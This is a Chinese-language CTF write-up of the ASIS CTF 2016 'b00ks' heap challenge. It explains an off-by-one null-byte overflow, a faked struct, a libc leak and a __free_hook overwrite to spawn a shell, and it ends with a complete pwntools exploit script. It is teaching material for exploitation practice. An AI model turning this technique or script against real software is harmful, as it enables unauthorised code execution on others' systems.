### Asis CTF 2016 b00ks
#### 1. 序言
>&nbsp;&nbsp;本篇文章是对[`CTF WIKI`](https://ctf-wiki.github.io/ctf-wiki/pwn/heap/off_by_one/) `Off-By-One`漏洞类型的补充. `CTF WIKI`上面`Off-By-One`这一章节中两个例子均没有给出相应的`EXP`, 本次总结将其中一个例子详细分析一下, 希望能够对其他学习者有帮助

#### 2. 程序简介
> 该程序是一个图书管理系统,可以添加书名,修改作者名以及写备注等功能.

#### 3. 程序运行

**1. Welcome**
> 输入一个`name`

**2. Create a book**
```
> 1
Enter book name size: 10
Enter book name (Max 32 chars): Love

Enter book description size: 20
Enter book description: good
```
**3. Delete**
```
> 2
Enter the book id you want to delete: 1
```
**4. Edit a book**
```
> 3
Enter the book id you want to edit: 1
Enter new book description: very good
```
**5. Print book detail**
```
> 4
ID: 1
Name: Love
Description: very good
Author: Bill
```
**6. Change current author name**
```
> 5
Enter author name: Steven
```
**7. Exit**
```
6. Exit
> 6
```
#### 4. 程序分析

1.`b00k`结构体
```c
stuct book{
  int id;
  char *name;
  char *description;
  int size;
}
```
&nbsp;&nbsp;&nbsp;&nbsp;程序运行, 创建一个结构体数组,设为`b00ks`.

2.`b00ks`位置
```
        0x55865b7c9040:	0x4141414141414141	0x4141414141414141
        0x55865b7c9050:	0x4141414141414141	0x4141414141414141 --> author
b00ks<--0x55865b7c9060:	0x000055865cc0d160(first book)	0x0000000000000000
```

3.`Null byte overflow`

&nbsp;&nbsp;&nbsp;&nbsp;修改`author`, 输入`32`个字符,会出现空子节覆盖`first b00k`指针最后一个字节
```
0x55865b7c9040:	0x4141414141414141	0x4141414141414141
0x55865b7c9050:	0x4141414141414141	0x4141414141414141
0x55865b7c9060:	0x000055865cc0d100(0x60-->0x00)	0x000055865cc0d190
```

#### 5. 漏洞介绍

&nbsp;&nbsp;&nbsp;&nbsp;`Off-By-One` 顾名思义就是我们能够多写入一个字节的内容.
> &nbsp;&nbsp;举一个简单的例子:建造一条直栅栏（即不围圈），长30米、每条栅栏柱间相隔3米，需要多少条栅栏柱？

&nbsp;&nbsp;最容易想到的答案是`10`, 但正确答案是`9`或`11`. 这种错误是C语言初学者常犯的错误, 经常在数组或循环出现.

#### 6. 漏洞分析
&nbsp;&nbsp;&nbsp;&nbsp;**漏洞点:** 问题出在对`author`的处理上, 当我们输入32个字符时, 程序会将第33个字符赋值为`"\x00"`, 从而出现了`Null Byte Overflow`.

![result](./01.png)

&nbsp;&nbsp;&nbsp;&nbsp;**思路分析:** 创建两个`b00k`, 在`first b00k`中伪造`b00k`进而控制`second b00k`的`description`指针, 将该指针该为`__free_hook`, 修改`second b00k`的`description`为`execve("/bin/sh")`, 最后`free`

#### 7. 分步讲解

**1. 创建第一个`first b00k`**
```
0x55f276c74160:	0x0000000000000001	               0x000055f276c74020--> Name
0x55f276c74170:	0x000055f276c740c0(description)	   0x000000000000008c(140)
```
&nbsp;&nbsp;&nbsp;&nbsp;**结论:** 当`0x55f276c74160 --> 0x55f276c74100`时, `0x55f276c74100`正好落在`first b00k`的`description`中, 属于可控范围, 为我们伪造`b00k`打下了基础.

**2. 伪造`b00k`**
```
0x55f276c740c0:	0x4141414141414141	0x4141414141414141
0x55f276c740d0:	0x4141414141414141	0x4141414141414141
0x55f276c740e0:	0x4141414141414141	0x4141414141414141
0x55f276c740f0:	0x4141414141414141	0x4141414141414141
0x55f276c74100:	0x0000000000000001	0x000055f276c74198----
0x55f276c74110:	0x000055f276c74198	0x000000000000ffff   |
......                                                   |
0x55f276c74160:	0x0000000000000001	0x000055f276c74020   |
0x55f276c74170:	0x000055f276c740c0	0x000000000000008c   |
0x55f276c74180:	0x0000000000000000	0x0000000000000031   |
0x55f276c74190:	0x0000000000000002	0x00007f282b8e7010 <-|
0x55f276c741a0:	0x00007f282b8c5010	0x0000000000021000
0x55f276c741b0:	0x0000000000000000	0x0000000000020e51
```
&nbsp;&nbsp;&nbsp;&nbsp;**结论:** 可以看到`0x55f276c74100`已经是`fake b00k`

**3. 空字节覆盖**
```
0x55f275d55040:	0x4141414141414141	0x4141414141414141
0x55f275d55050:	0x4141414141414141	0x4141414141414141
0x55f275d55060:	0x000055f276c74100	0x000055f276c74190
```
&nbsp;&nbsp;&nbsp;&nbsp;泄露的是`second b00k`的`name pointer`和`description pointer`.
这个指针和libc base address是有直接联系的.
```
0x000055f276c73000 0x000055f276c95000 rw-p	[heap]
0x00007f282b33e000 0x00007f282b4fe000 r-xp	/lib/x86_64-linux-gnu/libc-2.23.so
0x00007f282b4fe000 0x00007f282b6fe000 ---p	/lib/x86_64-linux-gnu/libc-2.23.so
```
&nbsp;&nbsp;`offset = 0x7f282b8e7010 - 0x00007f282b33e000 = 0x5a9010`

&nbsp;&nbsp;**结论:** 通过伪造的`b00k`, 我们泄露了 `libc base address`.

**4.获取相关指针**

主要是两个
```
malloc_hook = libc.symbols['__free_hook'] + libcbase
execve_addr = libcbase + 0x4526a
```
&nbsp;&nbsp;&nbsp;&nbsp;**结论:**  通过`libc base address`, 退出了`__free_hook`和`execve_addr`在程序中的实际位置.

**5.修改**

&nbsp;&nbsp;&nbsp;&nbsp;通过`first b00k`修改`second b00k`的`description`指针为`__free_hook`, 在修改second b00k的description内容为`execve("/bin/sh", null, environ)`, 最后执行`free`
```
0x55f276c74190:	0x0000000000000002	0x00007f282b7047a8 --
0x55f276c741a0:	0x00007f282b7047a8	0x0000000000021000  |
......                                                  |
0x7f282b7047a8 <__free_hook>:	0x00007f306ff4726a	0x0000000000000000
```
&nbsp;&nbsp;&nbsp;&nbsp;**结论:** 由于`__free_hook`里面的内容不为`NULL`, 遂执行内容指向的指令, 即`execve("/bin/sh", null, environ)`

#### 相关问题解答
**为什么第二个 `b00k`申请的空间那么大?**
> &nbsp;&nbsp;&nbsp;&nbsp;If we allocate a chunk bigger than the wilderness chunk, it mmap’s a new area for use. And this area is adjacent to the libc’s bss segment
简单的说, 申请小了不能够泄露出`libc base address`
#### 完整EXP
```
from pwn import *

context.log_level = 'debug'
p = process("./b00ks")
libc = ELF("./libc.so.6")
gdb.attach(p)

def memleak1(p):
     p.sendline("4")
     log.info(p.recvuntil("Author:"))
     msg = p.recvline()
     log.info(p.recvuntil(">"))
     msg = msg.split("A"*32)[1].strip("\n")
     addr = u64(msg.ljust(8, "\x00"))
     log.success("Leaked address of struct object : " + hex(addr))
     return addr

def memleak2(p):
     p.sendline("4")
     p.recvuntil("Name: ")
     msg=p.recvline().strip("\n")
     msg=u64(msg.ljust(8, "\x00"))
     log.info(p.recv(timeout = 1))
     log.success("Leaked address of allocated area " + hex(msg))
     return msg

def change_ptr(p):
     log.progress("Changing the struct pointer")
     p.sendline("5")
     log.info(p.recvuntil(":"))
     p.sendline("A"*32)
     log.info(p.recvuntil(">"))

def fake_obj(p, payload, index):
     log.progress("Editing description")
     p.sendline("3")
     log.info(p.recvuntil(":"))
     p.sendline(str(index))
     log.info(p.recvuntil(":"))
     p.sendline(payload)

def create_book(p,size):
     p.sendline("1")
     log.info(p.recvuntil(":"))
     p.sendline(str(size))
     log.info(p.recvuntil(":"))
     p.sendline("asdf")
     log.info(p.recvuntil(":"))
     p.sendline(str(size))
     log.info(p.recvuntil(":"))
     p.sendline("asdf")
     log.info(p.recvuntil(">"))

def release():
     p.sendline("2")
     log.info(p.recvuntil(":"))
     p.sendline("2")

log.info(p.recvuntil(":"))
p.sendline("A"*32)
log.info(p.recvuntil(">"))
create_book(p, 140)
addr = memleak1(p) + 0x38             #address of second object on heap
create_book(p, 0x21000)               #allocate new area
payload = "A"*0x40 + p64(0x1) + p64(addr) * 2 + p64(0xffff) #fake obj
fake_obj(p, payload, 1)
change_ptr(p)                         #null overflow
addr = memleak2(p)
log.info(hex(addr))

#part two
libcbase = addr - 0x5a9010
malloc_hook = libc.symbols['__free_hook'] + libcbase
execve_addr = libcbase + 0x4526a

#part three
payload = p64(malloc_hook) * 2
fake_obj(p, payload, 1)
payload = p64(execve_addr)
fake_obj(p, payload, 2)
release()

p.interactive()
```
#### 参考链接
[几乎唯一的WP](https://amritabi0s.wordpress.com/2016/06/11/asis-ctf-quals-2016-b00ks-writeup/)
[CTF WIKI](https://ctf-wiki.github.io/ctf-wiki/pwn/heap/off_by_one/)
